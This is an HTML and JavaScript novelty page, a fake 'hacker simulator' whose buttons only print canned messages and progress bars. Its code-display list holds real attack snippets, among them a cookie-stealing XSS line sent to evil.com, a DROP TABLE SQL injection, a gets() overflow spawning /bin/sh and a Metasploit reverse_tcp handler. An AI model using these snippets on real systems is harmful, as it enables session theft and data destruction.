<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HACKER SIMULATOR v2.1</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            position: relative;
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            opacity: 0.1;
        }

        .main-container {
            position: relative;
            z-index: 10;
            height: 100vh;
            display: grid;
            grid-template-columns: 1fr 1fr;
            grid-template-rows: 60px 1fr 150px;
            gap: 2px;
            padding: 2px;
        }

        .header {
            grid-column: 1 / -1;
            background: linear-gradient(90deg, #001100, #003300);
            border: 1px solid #00ff00;
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            box-shadow: 0 0 20px #00ff0040;
        }

        .logo {
            font-size: 24px;
            font-weight: bold;
            text-shadow: 0 0 10px #00ff00;
        }

        .status {
            display: flex;
            gap: 20px;
        }

        .status-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }

        .terminal {
            background: rgba(0, 20, 0, 0.9);
            border: 1px solid #00ff00;
            padding: 20px;
            overflow-y: auto;
            position: relative;
        }

        .code-viewer {
            background: rgba(0, 0, 20, 0.9);
            border: 1px solid #0088ff;
            padding: 20px;
            overflow-y: auto;
            color: #0088ff;
        }

        .terminal-header {
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .terminal-line {
            margin: 5px 0;
            animation: typewriter 0.5s;
        }

        @keyframes typewriter {
            from { width: 0; opacity: 0; }
            to { width: 100%; opacity: 1; }
        }

        .command-input {
            grid-column: 1 / -1;
            background: rgba(0, 50, 0, 0.9);
            border: 1px solid #00ff00;
            padding: 20px;
            display: flex;
            flex-direction: column;
        }

        .input-line {
            display: flex;
            align-items: center;
            margin-bottom: 10px;
        }

        .prompt {
            color: #ff6600;
            margin-right: 10px;
        }

        input {
            background: transparent;
            border: none;
            color: #00ff00;
            font-family: inherit;
            font-size: 16px;
            flex: 1;
            outline: none;
        }

        .tools {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .tool-btn {
            background: linear-gradient(45deg, #003300, #006600);
            border: 1px solid #00ff00;
            color: #00ff00;
            padding: 8px 15px;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
        }

        .tool-btn:hover {
            background: linear-gradient(45deg, #006600, #00aa00);
            box-shadow: 0 0 15px #00ff0060;
            transform: scale(1.05);
        }

        .progress-bar {
            width: 100%;
            height: 4px;
            background: #001100;
            border: 1px solid #00ff00;
            margin: 10px 0;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff00, #88ff88);
            width: 0%;
            transition: width 0.1s;
            box-shadow: 0 0 10px #00ff00;
        }

        .glitch {
            animation: glitch 0.3s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        .warning {
            color: #ff3300;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0; }
        }

        .success {
            color: #00ff88;
            text-shadow: 0 0 10px #00ff88;
        }
    </style>
</head>
<body>
    <canvas class="matrix-bg" id="matrix"></canvas>
    
    <div class="main-container">
        <div class="header">
            <div class="logo">◉ CYBERTERMINAL v2.1 ◉</div>
            <div class="status">
                <div class="status-item">
                    <div class="status-dot"></div>
                    <span>CONNECTED</span>
                </div>
                <div class="status-item">
                    <div class="status-dot"></div>
                    <span id="target-ip">192.168.1.1</span>
                </div>
                <div class="status-item">
                    <div class="status-dot"></div>
                    <span id="access-level">ROOT</span>
                </div>
            </div>
        </div>

        <div class="terminal">
            <div class="terminal-header">SYSTEM TERMINAL - ACTIVE SESSION</div>
            <div id="terminal-content">
                <div class="terminal-line">[SYSTEM] Initializing quantum encryption bypass...</div>
                <div class="terminal-line">[SYSTEM] Loading neural network algorithms...</div>
                <div class="terminal-line">[SYSTEM] Establishing secure connection...</div>
                <div class="terminal-line success">[SUCCESS] System ready for infiltration</div>
            </div>
            <div class="progress-bar">
                <div class="progress-fill" id="progress"></div>
            </div>
        </div>

        <div class="code-viewer">
            <div class="terminal-header" style="color: #0088ff; border-color: #0088ff;">LIVE CODE STREAM</div>
            <div id="code-content"></div>
        </div>

        <div class="command-input">
            <div class="input-line">
                <span class="prompt">hacker@cyberterm:~$</span>
                <input type="text" id="command-input" placeholder="Enter command..." autocomplete="off">
            </div>
            <div class="tools">
                <button class="tool-btn" onclick="runTool('portscan')">PORT SCAN</button>
                <button class="tool-btn" onclick="runTool('bruteforce')">BRUTE FORCE</button>
                <button class="tool-btn" onclick="runTool('sqlinjection')">SQL INJECT</button>
                <button class="tool-btn" onclick="runTool('cryptomine')">CRYPTO MINE</button>
                <button class="tool-btn" onclick="runTool('networkmap')">NET MAP</button>
                <button class="tool-btn" onclick="runTool('firewall')">BYPASS FW</button>
            </div>
        </div>
    </div>

    <script>
        // Matrix effect background
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');

        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;

        const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
        const matrixArray = matrix.split("");

        const fontSize = 10;
        const columns = canvas.width / fontSize;

        const drops = [];
        for(let x = 0; x < columns; x++) {
            drops[x] = 1;
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            ctx.fillStyle = '#00ff00';
            ctx.font = fontSize + 'px Courier New';
            
            for(let i = 0; i < drops.length; i++) {
                const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        setInterval(drawMatrix, 35);

        // Terminal functionality
        const terminalContent = document.getElementById('terminal-content');
        const codeContent = document.getElementById('code-content');
        const commandInput = document.getElementById('command-input');
        const progressBar = document.getElementById('progress');

        const hackingCommands = {
            'help': 'Available commands: scan, crack, inject, mine, map, bypass, access, status',
            'scan': 'Scanning target network...',
            'crack': 'Initiating password cracking sequence...',
            'inject': 'Deploying SQL injection payload...',
            'mine': 'Starting cryptocurrency mining operation...',
            'map': 'Mapping network topology...',
            'bypass': 'Bypassing security protocols...',
            'access': 'Gaining root access...',
            'status': 'System status: COMPROMISED - Access Level: ADMIN'
        };

        const codeSnippets = [
            'import hashlib\ndef crack_hash(target_hash):\n    for i in range(999999):\n        if hashlib.md5(str(i).encode()).hexdigest() == target_hash:\n            return i',
            'SELECT * FROM users WHERE id=1; DROP TABLE users;--',
            'void buffer_overflow() {\n    char buffer[64];\n    gets(buffer);\n    system("/bin/sh");\n}',
            'ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no admin@192.168.1.1',
            'nmap -sS -O -p- 192.168.1.0/24',
            'metasploit > use exploit/multi/handler\nmetasploit > set payload windows/meterpreter/reverse_tcp',
            'function xss_payload() {\n    document.cookie="session="+btoa("admin:admin");\n    location.href="//evil.com/?"+document.cookie;\n}',
            'openssl s_client -connect target.com:443 -cipher NULL,EXPORT'
        ];

        let terminalLines = 0;
        let isHacking = false;

        function addTerminalLine(text, className = '') {
            const line = document.createElement('div');
            line.className = `terminal-line ${className}`;
            line.textContent = text;
            terminalContent.appendChild(line);
            terminalContent.scrollTop = terminalContent.scrollHeight;
            terminalLines++;
            
            if (terminalLines > 20) {
                terminalContent.removeChild(terminalContent.firstChild);
                terminalLines--;
            }
        }

        function addCodeSnippet() {
            const snippet = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
            const codeBlock = document.createElement('div');
            codeBlock.innerHTML = snippet.replace(/\n/g, '<br>');
            codeBlock.style.marginBottom = '15px';
            codeBlock.style.padding = '10px';
            codeBlock.style.border = '1px solid #0088ff40';
            codeContent.appendChild(codeBlock);
            codeContent.scrollTop = codeContent.scrollHeight;
        }

        function simulateProgress(duration, callback) {
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    if (callback) callback();
                }
                progressBar.style.width = progress + '%';
            }, duration / 20);
        }

        function runTool(tool) {
            if (isHacking) return;
            
            isHacking = true;
            const toolActions = {
                'portscan': () => {
                    addTerminalLine('[PORTSCAN] Scanning ports on target...', 'warning');
                    simulateProgress(3000, () => {
                        addTerminalLine('[PORTSCAN] Found open ports: 22, 80, 443, 3389', 'success');
                        isHacking = false;
                    });
                },
                'bruteforce': () => {
                    addTerminalLine('[BRUTEFORCE] Attempting password combinations...', 'warning');
                    simulateProgress(5000, () => {
                        addTerminalLine('[BRUTEFORCE] Password cracked: admin123', 'success');
                        isHacking = false;
                    });
                },
                'sqlinjection': () => {
                    addTerminalLine('[SQL] Injecting malicious payload...', 'warning');
                    simulateProgress(2000, () => {
                        addTerminalLine('[SQL] Database compromised - Admin access gained', 'success');
                        isHacking = false;
                    });
                },
                'cryptomine': () => {
                    addTerminalLine('[CRYPTO] Deploying mining software...', 'warning');
                    simulateProgress(4000, () => {
                        addTerminalLine('[CRYPTO] Mining operation active - 0.05 BTC/hour', 'success');
                        isHacking = false;
                    });
                },
                'networkmap': () => {
                    addTerminalLine('[NETMAP] Discovering network topology...', 'warning');
                    simulateProgress(3500, () => {
                        addTerminalLine('[NETMAP] 47 devices mapped - Vulnerabilities detected', 'success');
                        isHacking = false;
                    });
                },
                'firewall': () => {
                    addTerminalLine('[FIREWALL] Analyzing security rules...', 'warning');
                    simulateProgress(4500, () => {
                        addTerminalLine('[FIREWALL] Bypass successful - All ports accessible', 'success');
                        isHacking = false;
                    });
                }
            };
            
            if (toolActions[tool]) {
                toolActions[tool]();
                addCodeSnippet();
            }
        }

        commandInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter' && !isHacking) {
                const command = commandInput.value.toLowerCase().trim();
                
                addTerminalLine(`hacker@cyberterm:~$ ${command}`);
                
                if (hackingCommands[command]) {
                    addTerminalLine(`[SYSTEM] ${hackingCommands[command]}`, 'success');
                } else if (command) {
                    addTerminalLine(`[ERROR] Command not found: ${command}`, 'warning');
                }
                
                commandInput.value = '';
                addCodeSnippet();
            }
        });

        // Auto-generate random activities
        setInterval(() => {
            if (!isHacking && Math.random() > 0.7) {
                const activities = [
                    '[MONITOR] Intercepted data packet from 192.168.1.23',
                    '[ALERT] Suspicious activity detected on port 8080',
                    '[TRACE] Connection established with proxy server',
                    '[LOG] Memory dump completed - 2.3GB analyzed',
                    '[SCAN] New vulnerability discovered: CVE-2024-' + Math.floor(Math.random() * 9999)
                ];
                addTerminalLine(activities[Math.floor(Math.random() * activities.length)]);
            }
        }, 8000);

        // Auto-add code snippets
        setInterval(addCodeSnippet, 12000);

        // Random IP updates
        setInterval(() => {
            const targetIp = document.getElementById('target-ip');
            const newIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
            targetIp.textContent = newIp;
        }, 15000);

        // Initial code snippet
        addCodeSnippet();
    </script>
</body>
</html>
